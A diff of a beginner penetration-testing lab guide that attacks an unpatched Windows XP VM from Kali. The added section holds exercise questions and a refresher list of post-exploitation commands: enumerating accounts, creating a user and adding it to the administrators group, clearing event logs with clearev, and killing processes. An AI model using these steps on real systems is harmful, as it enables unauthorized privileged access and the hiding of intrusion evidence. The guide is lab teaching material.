@@ -20,27 +20,27 @@ in this short guide. This guide is NOT for people that have no idea how to insta
 Linux/Windows OS or VMs. Google is your best friend and research is part of the job.
 
 COMMONS COMMANDS TO KNOW:
-• ls		- Lists Files/folders (LS)
-• cd		- Call Directory
-• dir		- Lists files/folders (Windows)
-• set
-• net user
+  • ls		- Lists Files/folders (LS)
+  • cd		- Call Directory
+  • dir		- Lists files/folders (Windows)
+  • set
+  • net user
 
 LEGEND:
-• Commands: 	Words in BOLD are commands
-• Comments: 	Words in italic red are comments or additional commands
-• Important: 	Words with asterisk lines are important notes or comments
+  • Commands: 	Words in BOLD are commands
+  • Comments: 	Words in italic red are comments or additional commands
+  • Important: 	Words with asterisk lines are important notes or comments
                 ****************************************************
 
 DEFAULT LOGINS:
-• Kali: root/toor
+  • Kali: root/toor
 
 WHAT YOU’LL NEED FOR THIS EXERCISE:
-• A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
+  • A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB
     o	Higher specs if you plan to run more than two VMs at a time
-• ISO file of Windows XP without Windows Update MS08_067
-• ISO file of the latest Kali release or any Linux distro that you want to update with the tools needed in this exercise.
-• OracleVirtualbox (free) or VMWare Workstation 12 or higher
+  • ISO file of Windows XP without Windows Update MS08_067
+  • ISO file of the latest Kali release or any Linux distro that you want to update with the tools needed in this exercise.
+  • OracleVirtualbox (free) or VMWare Workstation 12 or higher
 
 ******************************************************************************
 NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the
@@ -204,5 +204,83 @@ While in the spawned shell…
 ******************************************************************************
 NOTE: you can also kill services using their PID. Like: taskkill /PID 6984
 ******************************************************************************
+
+Next stop…using your new account to log in remotely! Stay tuned!
+
+EXERCISE QUESTIONS:
+Here are some Windows questions for you…
+
+1.	What was the command in meterpreter to find out your current location?
+
+2.	What is the command to rename a file?
+
+3.	What is the command to delete a file or folder?
+
+4.	What is the option to force delete a folder that contains files?
+
+
+SHORT/REFRESHER
+ATTACK:
+
+1. Do a Banner Grab…
+  a. Type: shell
+  b. Type: systeminfo
+
+2. Dig for more information…
+  a. Type: set
+
+3. Find the user’s domain, name and profile location…
+  a. Type: set user
+
+4. Find out what accounts are active in the target…
+  a. Type: net user
+
+5. Find out what account hasn’t been used for a while…
+  a. Type: net user <account_name>
+
+6. Create a new user account…
+  a. Type: net user susan /add
+
+7. Check to see if Susan has administrator rights…
+  a. Type: net user susan
+
+8. Find the correct syntax for the command to add Susan to the Administrator group…
+  a. Type: net
+
+9. Add susan to the administrators group…
+  a. Type: net localgroup administrators susan /add
+
+10. Check to see if susan is an admin…
+  a. Type: net user susan
+
+11. Change susan’s password…
+  a. Type: net user susan  <password>
+
+12. Check the last time the Administrator logged in…
+a. Net user Administrator
+
+13. While in XP check the logs in the Event viewer…
+  a. Open Security
+  b. Look for the Failure Audit and open any of them if you have more than one
+
+14. Run the Internet Explorer browser…
+
+15. Return to the running shell in Kali…
+
+16. Clear the logs in your target…
+  a. Exit the shell and back to meterpreter…
+  b. Type: clearev
+
+MISC STUFF:
+You can find the services running and kill them.
+
+While in the spawned shell…
+17. Now find what services are running…
+  a. Type: tasklist
+
+18. Find a service and kill it…
+  a. Type: taskkill /im iexplore.exe
+
+19. Return to XP and notice the browser is gone…go back to the running shell…
 
 Next stop…using your new account to log in remotely! Stay tuned!
